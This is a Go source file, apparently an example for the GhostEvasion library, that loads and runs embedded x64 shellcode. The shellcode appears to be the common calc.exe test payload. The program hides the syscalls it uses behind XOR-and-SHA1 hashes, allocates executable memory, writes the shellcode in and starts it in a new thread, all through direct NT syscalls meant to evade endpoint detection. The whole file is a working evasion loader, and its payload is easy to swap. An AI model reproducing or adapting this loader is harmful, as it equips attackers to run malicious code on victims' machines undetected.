package main

import (
	"crypto/sha1"
	"encoding/hex"
	"unsafe"

	ghostevasion "github.com/BlackShell256/GhostEvasion/pkg/GhostEvasion"
)

var shellcode = []byte{
	0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x54, 0x58, 0x66,
	0x83, 0xe4, 0xf0, 0x50, 0x6a, 0x60, 0x5a, 0x68, 0x63, 0x61,
	0x6c, 0x63, 0x54, 0x59, 0x48, 0x29, 0xd4, 0x65, 0x48, 0x8b,
	0x32, 0x48, 0x8b, 0x76, 0x18, 0x48, 0x8b, 0x76, 0x10, 0x48,
	0xad, 0x48, 0x8b, 0x30, 0x48, 0x8b, 0x7e, 0x30, 0x3, 0x57,
	0x3c, 0x8b, 0x5c, 0x17, 0x28, 0x8b, 0x74, 0x1f, 0x20, 0x48,
	0x1, 0xfe, 0x8b, 0x54, 0x1f, 0x24, 0xf, 0xb7, 0x2c, 0x17,
	0x8d, 0x52, 0x2, 0xad, 0x81, 0x3c, 0x7, 0x57, 0x69, 0x6e,
	0x45, 0x75, 0xef, 0x8b, 0x74, 0x1f, 0x1c, 0x48, 0x1, 0xfe,
	0x8b, 0x34, 0xae, 0x48, 0x1, 0xf7, 0x99, 0xff, 0xd7, 0x48,
	0x83, 0xc4, 0x68, 0x5c, 0x5d, 0x5f, 0x5e, 0x5b, 0x5a, 0x59,
	0x58, 0xc3,
}

func hash(f string) string {
	s := []byte(f)
	key := []byte{0xde, 0xad, 0xbe, 0xef}
	for i := 0; i < len(s); i++ {
		s[i] ^= key[i%len(key)]
	}
	sha := sha1.New()
	sha.Write(s)
	return hex.EncodeToString(sha.Sum(nil))[:16]
}

const (
	INFINITE               = 0xffffffff
	Handle                 = 0xffffffffffffffff
	MEM_COMMIT             = 0x00001000
	MEM_RESERVE            = 0x00002000
	PAGE_EXECUTE_READWRITE = 0x40
	GENERIC_EXECUTE        = 0x20000000
)

func main() {
	newWhisper := ghostevasion.Whisper(hash)

	NtAllocateVirtualMemory, err := newWhisper.GetSysid("1021ddc2cb8b096b")
	if err != nil {
		panic(err)
	}

	var BaseAddress uintptr
	RegionSize := uintptr(len(shellcode))

	err = NtAllocateVirtualMemory.Syscall(
		Handle,
		uintptr(unsafe.Pointer(&BaseAddress)),
		0,
		uintptr(unsafe.Pointer(&RegionSize)),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_EXECUTE_READWRITE,
	)
	if err != nil {
		panic(err)
	}

	NtWriteVirtualMemory, err := newWhisper.GetSysid("619eb9ad13d2bbd1")
	if err != nil {
		panic(err)
	}

	err = NtWriteVirtualMemory.Syscall(
		Handle,
		BaseAddress,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		0,
	)

	if err != nil {
		panic(err)
	}

	var Thread uintptr
	NtCreateThreadEx, err := newWhisper.GetSysid("2b72e62dd995115a")
	if err != nil {
		panic(err)
	}

	err = NtCreateThreadEx.Syscall(
		uintptr(unsafe.Pointer(&Thread)),
		GENERIC_EXECUTE,
		0,
		Handle,
		BaseAddress,
		0,
		0,
		0,
		0,
		0,
		0,
	)

	if err != nil {
		panic(err)
	}

	Time := -(INFINITE)
	NtWaitForSingleObject, err := newWhisper.GetSysid("5107adda1d10ef6e")
	if err != nil {
		panic(err)
	}

	err = NtWaitForSingleObject.Syscall(
		Thread,
		0,
		uintptr(unsafe.Pointer(&Time)),
	)
	if err != nil {
		panic(err)
	}

}
